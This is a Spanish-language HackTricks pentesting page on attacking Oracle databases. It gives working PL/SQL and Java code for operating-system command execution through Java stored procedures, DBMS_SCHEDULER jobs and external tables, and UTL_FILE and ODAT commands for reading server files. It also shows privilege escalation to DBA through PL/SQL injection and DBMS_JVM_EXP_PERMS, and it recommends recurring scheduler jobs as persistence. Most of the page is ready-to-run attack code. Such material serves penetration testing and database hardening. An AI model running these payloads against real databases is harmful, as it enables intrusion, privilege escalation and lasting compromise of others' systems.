<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Consigue la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# RCE: Procedimiento almacenado de Java

Imaginemos que tenemos la informaci√≥n de la cuenta de administrador. En este caso, una forma muy popular de ejecutar comandos en el servidor es escribir un procedimiento almacenado de Java. Esto se hace en tres etapas. Primero, se crea una clase Java llamada 'oraexec'. Para hacer esto, con√©ctese a trav√©s de la terminal 'sqlplus' y escriba:
```text
create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
  public class oraexec
  {
    public static void execCommand(String command) throws IOException
    {
      Runtime.getRuntime().exec(command);
    }
  }
/
 
```
A continuaci√≥n, escriba un envoltorio PL/SQL para esta clase:
```text
create or replace procedure javacmd(p_command varchar2) as language java name 'oraexec.execCommand(java.lang.String)'; /
```
Eso es todo. Ahora, para ejecutar un comando, todo lo que necesitas es enviar la siguiente consulta:
```text
exec javacmd('command');
```
Tenga en cuenta que al utilizar el procedimiento anterior, no podemos ver los resultados del comando ejecutado, sin embargo, puede redirigir la salida a un archivo y leerlo. Puede encontrar el c√≥digo completo del shell que permite leer y escribir archivos:

{% file src="../../.gitbook/assets/raptor\_oraexec.sql" %}

Sin embargo, hay un \[script m√°s sofisticado\] \(goo.gl/EuwPRU\) que maneja la salida del comando, pero tiene un tama√±o mayor [aqu√≠](https://oracle-base.com/articles/8i/shell-commands-from-plsql).

# RCE: Programador

El siguiente m√©todo, que nos ayudar√° si no hay una m√°quina virtual de Java, es utilizar 'dbmsscheduler', el programador de tareas incorporado de Oracle. Para usarlo, debe tener el privilegio 'CREATE EXTERNAL JOB'. Aqu√≠ hay un ejemplo de c√≥digo que implementa la entrada de la cadena '0wned' en un archivo de texto en la ra√≠z de la unidad C:
```text
exec DBMS_SCHEDULER.create_program('RDS2008','EXECUTABLE','c:\ WINDOWS\system32\cmd.exe /c echo 0wned &gt;&gt; c:\rds3.txt',0,TRUE);
exec DBMS_SCHEDULER.create_job(job_name =&gt; 'RDS2008JOB',program_name =&gt; 'RDS2008',start_date =&gt; NULL,repeat_interval =&gt; NULL,end_date =&gt; NULL,enabled =&gt; TRUE,auto_drop =&gt; TRUE); 
```
Esto crear√° y ejecutar√° un trabajo para ejecutar tu comando. Y aqu√≠ hay una opci√≥n para llamar al Planificador desde otro procedimiento - 'SYS.KUPP$PROC.CREATE\_MASTER\_PROCESS', que nos interesa principalmente porque te permite incrustar consultas de varias declaraciones, es decir, aquellas que consisten en m√∫ltiples subconsultas. Te√≥ricamente, puedes ejecutar dicha consulta incluso en caso de inyecci√≥n en una aplicaci√≥n web.
```text
select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''xxx'',''EXECUTABLE'',''cmd.exe /c echo qqq&gt;&gt;C:/scchh'',0,TRUE); DBMS_SCHEDULER.create_job(job_name=&gt;''jobx'',program_name=&gt;''xxx'',start_date=&gt;NULL,repeat_interval=&gt;NULL,end_date=&gt;NULL,enabled=&gt;TRUE,auto_drop=&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&gt;''xxx'');dbms_scheduler.purge_log;') from dual
```
Ten en cuenta que, al utilizar el Programador, puedes ejecutar esta tarea m√°s de una vez y hacerlo con cierta frecuencia. Como resultado, esto te ayudar√° a obtener un punto de apoyo en el sistema probado, porque incluso si el administrador elimina al usuario del SO, esta tarea que se ejecuta regularmente en el sistema lo traer√° de vuelta a la vida.

# RCE: Tablas Externas

Como √∫ltimo m√©todo para lograr la ejecuci√≥n de comandos del SO, me gustar√≠a mencionar el uso de Tablas Externas. Este m√©todo te ayudar√° a descargar archivos del servidor m√°s tarde. Necesitar√°s los siguientes privilegios:

* UTL\_FILE;
* CREATE TABLE;
* un directorio reservado para el usuario.

Recordemos que el acceso al paquete 'UTL\_FILE' se proporciona por defecto a todas las cuentas con el rol 'CONNECT'. Paso uno: Verifica los directorios emitidos con la siguiente consulta:
```text
SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE TABLE_NAME IN
(SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='DIRECTORY')
and privilege='EXECUTE' ORDER BY GRANTEE;
 
TABLE_NAME
------------------------------
ALICE_DIR
```
Paso dos: Crea un archivo batch ejecutable con el comando deseado:
```text
declare
 f utl_file.file_type;
 s varchar2(200) := 'echo KOKOKO &gt;&gt; C:/pwned';
begin
 f := utl_file.fopen('ALICE_DIR','test.bat','W');
 utl_file.put_line(f,s);
 utl_file.fclose(f);
end;
/
```
Paso tres: Prepara la tabla externa 'EXTT', la necesitar√°s para ejecutar el archivo:
```text
CREATE TABLE EXTT (line varchar2(256))
ORGANIZATION EXTERNAL
(TYPE oracle_loader
  DEFAULT DIRECTORY ALICE_DIR
  ACCESS PARAMETERS
  ( RECORDS DELIMITED BY NEWLINE
    FIELDS TERMINATED BY ',')
  LOCATION (alice_dir:'test.bat'))
/
```
Ahora, simplemente llama a tu archivo por lotes con el siguiente comando:
```text
SELECT * from EXTT;
```
La terminal comenzar√° a mostrar mensajes de error que indican que el sistema no puede encontrar la tabla y el archivo invocado, pero en este caso no es importante, ya que el objetivo principal era abrir el archivo ejecutable, lo cual se ha logrado.

La utilidad 'ODAT.py' tambi√©n puede implementar este ataque. Sin embargo, requiere el privilegio 'CREATE ANY DIRECTORY', que por defecto solo se otorga al rol de DBA, ya que intenta ejecutar el archivo desde cualquier directorio y no solo "el tuyo".

# Leer/Escribir archivos

Ahora, procedamos a la tarea de leer y escribir archivos. Si simplemente necesita leer o escribir un archivo en el servidor, puede hacerlo sin necesidad de utilizar procedimientos de Java, aunque estos tambi√©n pueden manejar tales tareas. Echemos un vistazo al paquete 'UTL_FILE', que tiene la funcionalidad requerida para trabajar con el sistema de archivos. La buena noticia es que, por defecto, puede ser accedido por todos los usuarios con el rol 'PUBLIC'. La mala noticia es que, por defecto, este procedimiento no tiene acceso a todo el sistema de archivos, sino solo a un directorio predefinido por el administrador. Sin embargo, no es raro encontrar un par√°metro de directorio especificado como '*', lo que literalmente significa "acceso a todo". Puede averiguar esto utilizando el siguiente comando:
```text
select name, value from v$parameter where name = 'utl_file_dir';
With appropriate rights, you can expand the access by using the following query:
alter system set utl_file_dir='*' scope =spfile;
```
Encontr√© que el procedimiento m√°s corto para usar el paquete 'UTL_FILE' es el propuesto por Alexander Polyakov:
```text
SET SERVEROUTPUT ON
declare
f utl_file.file_type;
sBuffer Varchar(8000);
begin
f:=UTL_FILE.FOPEN (''C:/‚Äô,'boot.ini','r');
loop
UTL_FILE.GET_LINE (f,sBuffer);
DBMS_OUTPUT.PUT_LINE(sBuffer);
end loop;
EXCEPTION
when no_data_found then
UTL_FILE.FCLOSE(f);
end;
/
 
```
Si necesitas m√°s funcionalidad con la capacidad de escribir, recomiendo buscar un script llamado 'raptor_oraexec.sql'. Y siguiendo la tradici√≥n, aqu√≠ hay una opci√≥n para usar la utilidad 'ODAT', que, como siempre, es la m√°s corta:
```text
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
```
El paquete 'UTL_FILE' tambi√©n es muy interesante porque si tienes suerte, puedes acceder a los registros, archivos de configuraci√≥n y obtener contrase√±as de cuentas privilegiadas, como 'SYS'.

El segundo m√©todo que me gustar√≠a mencionar es usar nuevamente las 'Tablas Externas'. Recuerda que, al usar 'Tablas Externas', la base de datos puede acceder en modo de lectura a los datos de las tablas externas. Para un hacker, esto significa otra oportunidad de descargar archivos del servidor, pero este m√©todo requiere el privilegio 'CREATE ANY DIRECTORY'. Sugiero usar inmediatamente 'ODAT', ya que es estable y r√°pido:
```text
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
# Elevaci√≥n de privilegios

Existen varios m√©todos para elevar privilegios, desde desbordamientos de b√∫fer cl√°sicos y parcheo de DLL hasta ataques especializados contra bases de datos, como inyecciones PL/SQL. El tema es muy extenso y, en este art√≠culo, no profundizar√© en √©l, ya que se discute en grandes documentos de investigaci√≥n, como los que se encuentran en los blogs de \[Lichfield\] \(goo.gl/IebQN4\) y \[Finnigan\] \(goo.gl/vXhttf\). Solo demostrar√© algunos de ellos, para que tengas una idea general. Durante las pruebas, recomiendo prestar atenci√≥n simplemente a los privilegios actuales y, en funci√≥n de esto, buscar lagunas deseadas en Internet.

A diferencia de MS SQL, donde un atacante puede inyectar 'xp\_cmdshell' casi inmediatamente despu√©s de 'SELECT' simplemente cerr√°ndolo con una comilla, Oracle DB rechaza rotundamente tales trucos. Por esta raz√≥n, no siempre podemos recurrir a inyecciones SQL cl√°sicas, aunque en este caso tambi√©n es posible encontrar una salida. Consideraremos inyecciones PL/SQL, que modifican el proceso de ejecuci√≥n de un procedimiento \(funci√≥n, disparador y otros objetos\) mediante la inserci√≥n de comandos aleatorios en los par√°metros de entrada disponibles. \(—Å\) Sh2kerr

Para insertar la carga √∫til, encuentre una funci√≥n donde los par√°metros de entrada no est√©n filtrados. Recuerde que Oracle SQL no permite consultas de m√∫ltiples declaraciones \(m√∫ltiples\), por lo tanto, es probable que deba usar algunos procedimientos "especiales" que tengan esta caracter√≠stica. La idea principal detr√°s del ataque es la siguiente: por defecto, a menos que se especifique lo contrario, el procedimiento se ejecuta en nombre del propietario y no en nombre del usuario que lo inici√≥. En otras palabras, si est√° disponible un procedimiento propiedad de la cuenta 'SYS' para su ejecuci√≥n y puede incrustar su c√≥digo en √©l, su carga √∫til tambi√©n se ejecutar√° en el contexto de la cuenta 'SYS'. Como ya mencion√©, esto no siempre sucede, ya que existen procedimientos con el par√°metro 'authid current\_user', lo que significa que este procedimiento se ejecutar√° con los privilegios del usuario actual. Sin embargo, por lo general, en cada versi√≥n, se pueden encontrar algunas funciones que son vulnerables a la inyecci√≥n PL/SQL. Una vista general de este proceso se muestra en la Fig. 2.

[![inject](https://hackmag.com/wp-content/uploads/2015/04/inject.png)](https://hackmag.com/wp-content/uploads/2015/04/inject.png)

En resumen, en lugar del argumento leg√≠timo esperado, pasamos alg√∫n c√≥digo malicioso que se convierte en parte del procedimiento. Un buen ejemplo es proporcionado por la funci√≥n 'CTXSYS.DRILOAD'. Se ejecuta en nombre de 'CTXSYS' y no filtra el par√°metro de entrada, lo que le permite ascender f√°cilmente a DBA:
```text
exec ctxsys.driload.validate_stmt('grant dba to scott');
```
Sin embargo, esto probablemente ya es historia, ya que la vulnerabilidad fue encontrada en 2004 y solo afecta a las versiones antiguas 8-9. Por lo general, el proceso de escalar privilegios se divide en dos partes: escribir el procedimiento que aumenta los derechos y realizar la inyecci√≥n en s√≠ misma. Un procedimiento t√≠pico es el siguiente:
```text
CREATE OR REPLACE FUNCTION F1
RETURN NUMBER AUTHID CURRENT_USER
IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
COMMIT;RETURN(1);END;
/
```
Ahora podemos inyectar un procedimiento como argumento de la funci√≥n vulnerable (ejemplo para versiones 10x):
```text
exec sys.kupw$WORKER.main('x','YY'' and 1=test1.f1 ‚Äì-');
```
En las versiones no muy recientes 10 y 11, hay una "bonita" excepci√≥n, o m√°s bien una vulnerabilidad, que permite ejecutar comandos en el servidor sin tener derechos de DBA: el procedimiento 'DBMS\_JVM\_EXP\_PERMS' permite a un usuario con el privilegio 'CREATE SESSION' obtener derechos de 'JAVA IO'. El ataque se puede montar de la siguiente manera:
```text
SQL&gt; DECLARE
   POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
   CURSOR C1 IS SELECT
'GRANT','GREMLIN','SYS','java.io.FilePermission','&lt;FILES&gt;&gt;','execute','ENABLED' FROM DUAL;
  BEGIN
  OPEN C1;
  FETCH C1 BULK COLLECT INTO POL;
  CLOSE C1;
  DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
  END;
  /
 
PL/SQL procedure successfully completed.
```
Ahora que tienes los privilegios para llamar a procedimientos de Java, puedes provocar una respuesta del int√©rprete de Windows y ejecutar algo:
```text
SQL&gt; select dbms_java.runjava(‚Äòoracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c echo 123 &gt;c:\\hack‚Äô)from dual;
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme en** **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al repositorio [hacktricks](https://github.com/carlospolop/hacktricks) y al repositorio [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
